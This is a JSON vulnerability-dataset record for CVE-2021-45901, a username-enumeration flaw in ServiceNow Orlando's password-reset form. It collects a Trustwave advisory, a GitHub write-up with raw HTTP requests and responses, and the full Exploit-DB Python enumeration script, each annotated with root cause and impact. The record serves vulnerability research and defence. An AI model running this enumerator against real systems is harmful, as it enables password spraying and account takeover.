```json
{
  "CVE-2021-45901": {
    "related_content": [
      {
        "source": "www.trustwave.com_b487788a_20250115_230150.html",
        "text": "During a recent engagement Trustwave SpiderLabs discovered a vulnerability (CVE-2021-45901) within ServiceNow (Orlando) which allows for a successful username enumeration by using a wordlist. By using an unauthenticated session and navigating to the password reset form, it is possible to infer a valid username. This is achieved through examination of the HTTP POST response data initially triggered by the password reset web form. This response differs depending on a username's existence.\n\nThis type of vulnerability can be used to chain together further attacks, such as password spray attacks, using known valid usernames.\n\nServiceNow is a highly utilized productivity management platform and in many cases is accessible via public domains. ServiceNow has patched this issue and recommends users update to ServiceNow (Rome) or later.",
        "vulnerability_details": {
          "root_cause": "The vulnerability is due to different HTTP POST responses based on whether a username exists, allowing for enumeration.",
          "weaknesses": [
            "Username Enumeration"
          ],
          "impact": "Allows attackers to enumerate valid usernames, which can be used in further attacks like password spraying.",
          "attack_vectors": [
            "Unauthenticated access to the password reset form"
          ],
          "attacker_capabilities": [
            "Ability to send HTTP POST requests to the password reset form",
            "Ability to observe differences in HTTP POST responses"
          ]
        }
      },
      {
        "source": "github.com_054846f1_20250115_230151.html",
        "text": "# CVE-2021-45901 (ServiceNow - Username Enumeration)\n\n# Title\n\nUsername Enumeration Vulnerability found in ServiceNow Application\n\nPublished: Version: 1.0\n\nVendor: ServiceNow\n\nProduct: ServiceNow (<https://www.servicenow.com/>)\n\nVersion affected: Orlando (glide-orlando-12-11-2019\\_\\_patch5-06-17-2020)\n\n## Description\nThe vulnerability discovered in ServiceNow (Orlando) allows for successful username enumeration, using a wordlist. Using an unauthenticated session and navigating to the password reset form, it is possible to infer a valid username. This is achieved through examination of the HTTP POST response data initially triggered by the password reset web form. This response differs depending on username existence.\n\nNOTE: In order to automate this process a valid Session Cookie (JSESSIONID), CSRF Token(pwd\\_csrf\\_token) and X-UserToken (X-UserToken) are required. All of these objects are recoverable from within client side code.\n\n## Example\n\nThe following illustrates the observable discrepancies within the HTTP Response POST Data, used to infer a valid vs non-valid username.\n\n```\nRequest\nPOST /$pwd_reset.do?sysparm_url=ss_default HTTP/1.1\nHost: <IP>\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-type: application/x-www-form-urlencoded; charset=UTF-8\nX-UserToken: <UserToken>\nContent-Length: 421\nOrigin: https://<IP>/\nConnection: keep-alive\nCookie: glide_user_route=glide.da<redacted>; JSESSIONID=<redacted>;__CJ_g_startTime='<time>'\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\n\nsysparm_processor=PwdAjaxVerifyIdentity&sysparm_scope=global&sysparm_want_session_messages=true&sysparm_name=verifyIdentity&sysparm_process_id=<redacted>&sysparm_processor_id_0=<redacted>&sysparm_user_id_0=admin&sysparm_identification_number=1&sysparm_pwd_csrf_token=<redacted>&ni.nolog.x_referer=ignore&x_referer=%24pwd_reset.do%3Fsysparm_url%3Dss_default\n\nResponse (Valid Username)\nHTTP/1.1 200 OK\nSet-Cookie: glide_user=\"\"; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Path=/; HttpOnly\nSet-Cookie: glide_user_session=\"\"; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Path=/; HttpOnly\nX-Is-Logged-In: false\nX-Transaction-ID: f7ca428075d6\nPragma: no-store,no-cache\nCache-Control: no-cache,no-store,must-revalidate,max-age=-1\nExpires: 0\nX-Frame-Options: SAMEORIGIN\nContent-Encoding: gzip\nX-TRANSACTION-TIME-MS: 1227\nX-TRANSACTION-TIME: 0:00:01.227\nContent-Type: text/xml\nTransfer-Encoding: chunked\nDate: Thu, 26 Aug 2021 05:59:41 GMT\nServer: <redacted>\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n   <xml answer=\"200\" sysparm_max=\"15\" sysparm_name=\"verifyIdentity\" sysparm_processor=\"PwdAjaxVerifyIdentity\">\n   <security message=\"\" pwd_csrf_token=\"<redacted>\" status=\"ok\"/>\n</xml>\n\nResponse (Invalid Username)\nHTTP/1.1 200 OK\nSet-Cookie: glide_user=\"\"; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Path=/; HttpOnly\nSet-Cookie: glide_user_session=\"\"; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Path=/; HttpOnly\nX-Is-Logged-In: false\nX-Transaction-ID: 0b83260c75d6\nPragma: no-store,no-cache\nCache-Control: no-cache,no-store,must-revalidate,max-age=-1\nExpires: 0\nX-Frame-Options: SAMEORIGIN\nContent-Encoding: gzip\nX-TRANSACTION-TIME-MS: 1076\nX-TRANSACTION-TIME: 0:00:01.076\nContent-Type: text/xml\nTransfer-Encoding: chunked\nDate: Thu, 26 Aug 2021 06:10:41 GMT\nServer: <redacted>\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n   <xml answer=\"500\" sysparm_max=\"15\" sysparm_name=\"verifyIdentity\" sysparm_processor=\"PwdAjaxVerifyIdentity\">\n   <security message=\"\" pwd_csrf_token=\"<redacted>\" status=\"ok\"/>\n</xml>\n```\n\n## Remediation Steps\n\nUpgrade to \"Rome\"\n\n*   Introduction of captcha within version \"Rome\" of the software\n*   Generic HTTP responses which hide valid user responses\n*   Obfuscation of client side code in order to keep session tokens, cookies and csrf tokens hidden in client side code\n*   Introduction of server side hashing mechanism to hash pertinent objects which can then be reversed on client side",
          "vulnerability_details": {
            "root_cause": "The vulnerability is caused by different responses from the server for valid and invalid usernames during the password reset process.",
            "weaknesses": [
              "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
                 "CWE-203: Observable Discrepancy"
            ],
             "impact": "An attacker can enumerate valid usernames by observing the HTTP response differences. This enumeration can be a pre-step for password spray attacks.",
             "attack_vectors": [
              "Unauthenticated access to the password reset form",
              "Analyzing HTTP POST response data"
            ],
             "attacker_capabilities": [
               "Ability to make unauthenticated requests",
               "Ability to observe and analyze HTTP POST responses",
                 "Knowledge of the vulnerability to distinguish between valid and invalid user responses"

            ]
          }
      },
       {
        "source": "www.exploit-db.com_3c0c6bad_20250115_230213.html",
        "text": "# Exploit Title: ServiceNow - Username Enumeration\n# Google Dork: NA\n# Date: 12 February 2022\n# Exploit Author: Victor Hanna (Trustwave SpiderLabs)\n# Author Github Page: https://9lyph.github.io/CVE-2021-45901/\n# Vendor Homepage: https://www.servicenow.com/\n# Software Link: https://docs.servicenow.com/bundle/orlando-servicenow-platform/page/product/mid-server/task/t_DownloadMIDServerFiles.html\n# Version: Orlando\n# Tested on: MAC OSX\n# CVE : CVE-2021-45901\n\n\n#!/usr/local/bin/python3\n# Author: Victor Hanna (SpiderLabs)\n# User enumeration script SNOW\n# Requires valid 1. JSESSION (anonymous), 2. X-UserToken and 3. CSRF Token\n\nimport requests\nimport re\nimport urllib.parse\nfrom colorama import init\nfrom colorama import Fore, Back, Style\nimport sys\nimport os\nimport time\n\nfrom urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\n\ndef banner():\n    print (\"[+]********************************************************************************[+]\")\n    print (\"|   Author : Victor Hanna (9lyph)[\"+Fore.RED + \"SpiderLabs\" +Style.RESET_ALL+\"]\\t\\t\\t\\t\\t    |\")\n    print (\"|   Decription: SNOW Username Enumerator                                            |\")\n    print (\"|   Usage : \"+sys.argv[0]+\"                                                        |\")\n    print (\"|   Prequisite: \'users.txt\' needs to contain list of users                          |\")\n    print (\"[+]********************************************************************************[+]\")\n\ndef main():\n    os.system('clear')\n    banner()\n    proxies = {\n        \"http\":\"http://127.0.0.1:8080/\",\n        \"https\":\"http://127.0.0.1:8080/\"\n    }\n    url = \"http://<redacted>/\"\n    try:\n        # s = requests.Session()\n        # s.verify = False\n        r = requests.get(url, timeout=10, verify=False, proxies=proxies)\n        JSESSIONID = r.cookies[\"JSESSIONID\"]\n        glide_user_route = r.cookies[\"glide_user_route\"]\n        startTime = (str(time.time_ns()))\n        # print (startTime[:-6])\n    except requests.exceptions.Timeout:\n        print (\"[!] Connection to host timed out !\")\n        sys.exit(1)\n    except requests.exceptions.ProxyError:\n        print (\"[!] Can't communicate with proxy !\")\n        sys.exit(1)\n\n    with open (\"users.txt\", \"r\") as f:\n        usernames = f.readlines()\n        print (f\"[+] Brute forcing ....\")\n        for users in usernames:\n            url = \"http://<redacted>/$pwd_reset.do?sysparm_url=ss_default\"\n            headers1 = {\n                \"Host\": \"<redacted>\",\n                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0\",\n                \"Accept\": \"*/*\",\n                \"Accept-Language\": \"en-US,en;q=0.5\",\n                \"Accept-Encoding\": \"gzip, deflate\",\n                \"Connection\": \"close\",\n                \"Cookie\": \"glide_user_route=\"+glide_user_route+\"; JSESSIONID=\"+JSESSIONID+\"; __CJ_g_startTime=\'\"+startTime[:-6]+\"\'\"\n                }\n\n            try:\n                # s = requests.Session()\n                # s.verify = False\n                r = requests.get(url, headers=headers1, timeout=20, verify=False, proxies=proxies)\n                obj1 = re.findall(r\"pwd_csrf_token\", r.text)\n                obj2 = re.findall(r\"fireAll\\(\\\"ck_updated\\\"\", r.text)\n                tokenIndex = (r.text.index(obj1[0]))\n                startTime2 = (str(time.time_ns()))\n                # userTokenIndex = (r.text.index(obj2[0]))\n                # userToken = (r.text[userTokenIndex+23 : userTokenIndex+95])\n                token = (r.text[tokenIndex+45:tokenIndex+73])\n                url = \"http://<redacted>/xmlhttp.do\"\n                headers2 = {\n                    \"Host\": \"<redacted>\",\n                    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0\",\n                    \"Accept\": \"*/*\",\n                    \"Accept-Language\": \"en-US,en;q=0.5\",\n                    \"Accept-Encoding\": \"gzip, deflate\",\n                    \"Referer\": \"http://<redacted>/$pwd_reset.do?sysparm_url=ss default\",\n                    \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\",\n                    \"Content-Length\": \"786\",\n                    \"Origin\": \"http://<redacted>/\",\n                    \"Connection\": \"keep-alive\",\n                    # \"X-UserToken\":\"\"+userToken+\"\",\n                    \"Cookie\": \"glide_user_route=\"+glide_user_route+\";JSESSIONID=\"+JSESSIONID+\"; __CJ_g_startTime=\'\"+startTime2[:-6]+\"\'\"\n                    }\n\n                data = {\n                    \"sysparm_processor\": \"PwdAjaxVerifyIdentity\",\n                    \"sysparm_scope\": \"global\",\n                    \"sysparm_want_session_messages\": \"true\",\n                    \"sysparm_name\":\"verifyIdentity\",\n                    \"sysparm_process_id\":\"c6b0c20667100200a5a0f3b457415ad5\",\n                    \"sysparm_processor_id_0\":\"fb9b36b3bf220100710071a7bf07390b\",\n                    \"sysparm_user_id_0\":\"\"+users.strip()+\"\",\n                    \"sysparm_identification_number\":\"1\",\n                    \"sysparam_pwd_csrf_token\":\"\"+token+\"\",\n                    \"ni.nolog.x_referer\":\"ignore\",\n                    \"x_referer\":\"$pwd_reset.do?sysparm_url=ss_default\"\n                    }\n\n                payload_str = urllib.parse.urlencode(data, safe=\":+\")\n\n            except requests.exceptions.Timeout:\n                print (\"[!] Connection to host timed out !\")\n                sys.exit(1)\n\n            try:\n                # s = requests.Session()\n                # s.verify = False\n                time.sleep(2)\n                r = requests.post(url, headers=headers2, data=payload_str, timeout=20, verify=False, proxies=proxies)\n                if \"500\" in r.text:\n                    print (Fore.RED + f\"[-] Invalid user: {users.strip()}\" + Style.RESET_ALL)\n                    f = open(\"enumeratedUserList.txt\", \"a+\")\n                    f.write(Fore.RED + f\"[-] Invalid user: {users.strip()}\\n\" + Style.RESET_ALL)\n                    f.close()\n                elif \"200\" in r.text:\n                    print (Fore.GREEN + f\"[+] Valid user: {users.strip()}\" + Style.RESET_ALL)\n                    f = open(\"enumeratedUserList.txt\", \"a+\")\n                    f.write(Fore.GREEN + f\"[+] Valid user: {users.strip()}\\n\" + Style.RESET_ALL)\n                    f.close()\n                else:\n                    print (Fore.RED + f\"[-] Invalid user: {users.strip()}\" + Style.RESET_ALL)\n                    f = open(\"enumeratedUserList.txt\", \"a+\")\n                    f.write(Fore.RED + f\"[-] Invalid user: {users.strip()}\\n\" + Style.RESET_ALL)\n                    f.close()\n            except KeyboardInterrupt:\n                sys.exit()\n            except requests.exceptions.Timeout:\n                print (\"[!] Connection to host timed out !\")\n                sys.exit(1)\n            except Exception as e:\n                print (Fore.RED + f\"Unable to connect to host\" + Style.RESET_ALL)\n\nif __name__ == \"__main__\":\n    main ()\n",
          "vulnerability_details": {
            "root_cause": "The root cause of the vulnerability is the ability to distinguish between valid and invalid usernames based on the HTTP response. The server sends different HTTP responses depending on whether or not the username exists. A valid response contains `answer=\"200\"` and an invalid response contains `answer=\"500\"`",
            "weaknesses": [
              "Username Enumeration",
              "Exposure of Sensitive Information to an Unauthorized Actor"
            ],
            "impact": "An attacker can identify valid usernames from a list of potential users, which can then be used for subsequent attacks such as password spraying or brute force attempts.",
            "attack_vectors": [
              "Unauthenticated access to the password reset page",
              "Observation of HTTP Response POST Data"
            ],
             "attacker_capabilities": [
              "Knowledge of the vulnerability",
              "Ability to make HTTP POST requests",
              "Ability to extract and validate HTTP response data"
            ]
          }
      }
    ]
  }
}
```